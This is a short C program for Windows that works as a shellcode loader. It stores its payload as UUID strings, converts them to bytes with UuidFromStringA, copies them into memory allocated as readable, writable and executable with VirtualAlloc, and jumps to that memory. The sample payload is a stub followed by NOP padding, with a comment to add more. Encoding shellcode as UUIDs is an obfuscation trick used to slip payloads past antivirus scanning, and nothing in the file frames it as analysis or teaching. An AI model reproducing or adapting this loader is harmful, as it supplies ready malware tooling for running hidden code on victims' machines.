#include <stdio.h>
#include <windows.h>
#include <rpc.h>  // For UUID handling

#pragma comment(lib, "Rpcrt4.lib")

int main() {
    // Array of UUIDs generated from the shellcode
    const char *uuids[] = {
        "f0e48f00-083c-4183-9090-909090909090",
        "90909090-9090-9090-9090-909090909090"
        // Add more UUIDs as necessary
    };

    int num_uuids = sizeof(uuids) / sizeof(uuids[0]);
    size_t shellcode_size = num_uuids * 16;  // 16 bytes per UUID
    void *exec_mem;
    UUID uuid;
    unsigned char *buffer;

    // Allocate executable memory
    exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory\n");
        return -1;
    }

    buffer = (unsigned char *)exec_mem;
    for (int i = 0; i < num_uuids; i++) {
        // Convert UUID string back to binary
        if (UuidFromStringA((RPC_CSTR)uuids[i], &uuid) != RPC_S_OK) {
            printf("Failed to convert UUID to binary\n");
            return -1;
        }
        // Copy the 16 bytes from the UUID into the allocated memory
        memcpy(buffer + i * 16, &uuid, 16);
    }

    // Execute the shellcode
    ((void(*)())exec_mem)();

    return 0;
}

